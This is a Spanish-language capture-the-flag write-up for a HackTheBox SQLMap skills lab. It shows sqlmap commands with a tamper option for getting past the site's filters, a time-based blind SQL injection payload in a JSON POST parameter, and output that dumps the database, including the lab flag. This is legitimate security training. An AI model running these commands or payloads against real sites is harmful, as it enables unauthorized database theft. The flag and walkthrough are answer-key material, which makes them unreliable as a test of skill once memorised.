
# SQLMap - Skills Assessment

Se le otorga acceso a una aplicación web con mecanismos de protección básicos. Utilice las habilidades aprendidas en este módulo para encontrar la vulnerabilidad SQLi con SQLMap y explotarla. Para completar este módulo, busque la flag y envíela.

```
Objetivo: 94.237.54.205:48460
```

***

## <mark style="color:purple;">Acceso inicial</mark>

<figure><img src="/files/WoNXzFImxypZxLpLsF0o" alt=""><figcaption></figcaption></figure>

Al acceder a la URL parece un ecommerce de venta de zapatos.

## <mark style="color:purple;">Descripción general</mark> <a href="#id-57b8" id="id-57b8"></a>

El objetivo de esta prueba de penetración es identificar y explotar posibles vulnerabilidades en el sitio web de comercio electrónico MiniShop. El objetivo principal es descubrir vulnerabilidades de inyección SQL en los distintos campos de entrada del sitio web mediante el uso de SQLMap.

## <mark style="color:purple;">Metodología</mark> <a href="#id-1069" id="id-1069"></a>

### 1. Análisis inicial <a href="#d406" id="d406"></a>

Al acceder al sitio web de MiniShop, se observó que existen numerosas áreas que permiten la entrada de datos por parte del usuario. Debido a la prevalencia de la entrada de datos por parte del usuario, la primera hipótesis fue una posible vulnerabilidad de inyección SQL.

### 2. Inspección a través de herramientas para desarrolladores y BurpSuite <a href="#id-92ee" id="id-92ee"></a>

Se realizó un examen exhaustivo de las solicitudes HTTP GET y POST utilizando tanto el modo de desarrollador del sitio web como la herramienta BurpSuite. Se examinó el formulario de contacto en busca de posibles puntos de inyección SQL, pero la ausencia de variables como `?id=1` o `?uid=1` etc descartó vulnerabilidades inmediatas.

<figure><img src="/files/bq74nglkZ4V8v2osELSH" alt=""><figcaption></figcaption></figure>

### 3. Investigación de la sección Shop <a href="#id-2d6d" id="id-2d6d"></a>

Se detectaron anomalías en la sección de Compras, donde se encontró un artículo preexistente en el carrito de compras. Sin embargo, este comportamiento podría atribuirse a un escenario de HackTheBox. Un análisis posterior no reveló hallazgos significativos en las solicitudes HTTP relacionadas con los formularios de contacto y detalles de envío.

### 4. Identificación de inyección SQL mediante solicitud POST <a href="#c0e4" id="c0e4"></a>

Al agregar un nuevo artículo al carrito de compras, se descubrió una solicitud POST a través de BurpSuite.

<figure><img src="/files/hrpYcv1nLKofD2aUWefw" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/dhwvNOiZK2mstcHjTsLr" alt=""><figcaption></figcaption></figure>

#### Fases del descubrimiento de SQLi:

1. Añadir un artículo al carrito
2. En Burpsuite observamos el parámetro id vulnerable
3. Guardamos la solicitud para escanear con burpsuite

La solicitud se guardó como un archivo con el nombre `post1`. Como sabemos que esta web tiene ciertas medidas de protección habilitadas, vamos a usar la flag `--tamper=between` para intentar hacer el bypass:

```shell-session
afsh4ck@kali$ sqlmap -r post1 --batch --tamper=between
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:24:38 /2024-08-14/

[14:24:38] [INFO] parsing HTTP request from 'post1'
[14:24:38] [INFO] loading tamper module 'between'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[14:24:38] [INFO] testing connection to the target URL
[14:24:38] [INFO] testing if the target URL content is stable
<------SNIP------>
[14:29:19] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[14:29:22] [INFO] checking if the injection point on (custom) POST parameter 'JSON id' is a false positive
(custom) POST parameter 'JSON id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2204 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 3592 FROM (SELECT(SLEEP(5)))wIkb)"}
```

Encontramos que es vulnerable a SQLi con el payload:

```
{"id":"1 AND (SELECT 3592 FROM (SELECT(SLEEP(5)))wIkb)"}
```

Vamos a explotarlo.

### 5. Explotación de SQLi

#### Enumeración básica de usuario, base de datos y DBA

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ sqlmap -r post1 --tamper=between --batch --dump --current-user --current-db --is-dba
</strong>        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.4#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:33:00 /2024-08-14/

[14:33:00] [INFO] parsing HTTP request from 'post1'
[14:33:00] [INFO] loading tamper module 'between'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[14:33:01] [INFO] resuming back-end DBMS 'mysql' 
[14:33:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:

[14:33:01] [INFO] fetching current user
current user: 'admin@localhost'
[14:34:20] [INFO] fetching current database
[14:34:20] [INFO] retrieved: production
current database: 'production'
[14:35:06] [INFO] testing if current user is DBA
[14:35:06] [INFO] fetching current user
current user is DBA: False
[14:35:06] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:35:06] [INFO] fetching current database
[14:35:06] [INFO] fetching tables for database: 'production'
[14:35:06] [INFO] fetching number of tables for database 'production'
[14:35:06] [INFO] retrieved: 5
[14:35:09] [INFO] retrieved: final_flag
[14:35:52] [INFO] retrieved: order_items
[14:36:42] [INFO] retrieved: products
[14:37:18] [INFO] retrieved: catigories
[14:37:55] [INFO] retrieved: brands
[14:38:19] [INFO] fetching columns for table 'final_flag' in database 'production'
[14:38:19] [INFO] retrieved: 2
[14:38:22] [INFO] retrieved: id
[14:38:31] [INFO] retrieved: content
[14:39:03] [INFO] fetching entries for table 'final_flag' in database 'production'
[14:39:03] [INFO] fetching number of entries for table 'final_flag' in database 'production'
[14:39:03] [INFO] retrieved: 1
[14:39:06] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                               
HTB{n07_50_h4rd_r16h7?!}
[14:41:05] [INFO] retrieved: 1
Database: production
Table: final_flag
[1 entry]
+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?} |
+----+--------------------------+
</code></pre>

Como vemos obtenemos información relevante sobre el usuario, la base de datos y si tiene permisos DBA:

```
current user: 'admin@localhost'
current database: 'production'
current user is DBA: False
```

Y conseguimos hacer el volcado de la base de datos, obteniendo la flag correctamente! 🏆
